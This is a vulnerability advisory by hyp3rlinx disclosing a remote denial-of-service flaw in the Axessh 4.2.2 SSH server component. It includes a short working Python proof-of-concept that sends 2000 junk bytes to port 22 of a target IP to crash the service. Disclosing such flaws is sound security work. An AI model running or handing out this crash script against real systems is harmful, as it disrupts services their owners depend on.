@@ -1,0 +1,85 @@
+[+] Credits: John Page aka hyp3rlinx	
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AXESSH-DENIAL-OF-SERVICE.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+============
+www.labf.com
+
+
+
+Product:
+=============
+Axessh 4.2.2
+
+Axessh is a SSH client. It is a superb terminal emulator/telnet client for Windows. It provides SSH capabilities to Axessh without
+sacrificing any of existing functionality. Furthermore, Axessh has been developed entirely outside of the USA, and can be sold
+anywhere in the world (apart from places where people aren't allowed to own cryptographic software).
+
+2. Axessh features include:
+Compatible with SSH protocol version 2.0 (a SSH2-client based on OpenSSH 3.4)
+Compatible with SSH protocol version 1.5
+Ciphers(for the SSH1-client): 3DES, Blowfish, DES, RC4
+Ciphers(for the SSH2-client): 3DES, Blowfish, CAST128, ARCFOUR, AES128, AES192, AES256-cbc
+Authentication using password
+Authentication RSA
+Compression support
+Connection forwarding, including full support for X-protocol connection forwarding
+"Dynamic Forwarding" which provides other tasks on the same PC with requested port forwarding 
+
+
+
+Vulnerability Type:
+====================
+Denial Of Service
+
+AxeSSH will crash after receiving a overly long payload of junk...
+
+
+
+Exploit code(s):
+===============
+
+1) Open the settings window for axessh and choose Run then click Run as EXE, this will launch "xwpsshd.exe"
+crashes with bad protocol version.
+
+
+import socket
+
+print "Axessh 4.2.2 XwpSSHD (wsshd.exe) Remote Denial Of Service"
+
+ip = raw_input("[IP]> ")
+port = 22
+payload="A"*2000
+s=socket.create_connection((ip,port))
+s.send(payload)
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+Medium
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
